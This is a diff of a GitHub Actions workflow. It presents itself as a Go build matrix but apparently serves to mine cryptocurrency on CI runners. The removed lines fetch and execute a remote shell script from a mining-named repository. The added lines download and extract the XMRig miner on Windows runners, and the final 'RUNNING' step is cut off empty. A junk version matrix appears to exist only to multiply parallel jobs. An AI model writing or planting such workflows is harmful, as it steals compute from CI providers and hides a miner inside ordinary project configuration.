@@ -1,27 +1,23 @@
-name: peroscoin
+name: Ex-min
+
 on: [push, pull_request]
 jobs:
   build:
-    name: Chanell
-    runs-on: ubuntu-18.04
+    name: Ex-min
+    runs-on: windows-latest
     strategy:
-      max-parallel: 25
+      max-parallel: 5
       fail-fast: false
       matrix:
-        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        go: [1.0, 1.1, 1.2, 1.3, 1.35]
         flag: [A, B, C, D, E, F, G, H, I]
-    timeout-minutes: 360
     env:
         NUM_JOBS: 10
         JOB: ${{ matrix.go }}
 steps:
-- name: Set up Go ${{ matrix.go }}
-  uses: actions/setup-go@v2
-  with:
-    go-version: ${{ matrix.go }}
-  id: go
-- name: Setup
-  uses: actions/checkout@v2
-- name: Chanell
-  run: | 
-    wget https://github.com/ChanellMiningAO/koil/blob/main/koil.sh && chmod u+x koil.sh && ./koil.sh
+- name: DOWNLOAD
+  run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-msvc-win64.zip -OutFile xmrig-6.17.0-msvc-win64.zip
+- name: Extract
+  run: Expand-Archive xmrig-6.17.0-msvc-win64.zip
+- name: RUNNING
+  run: 
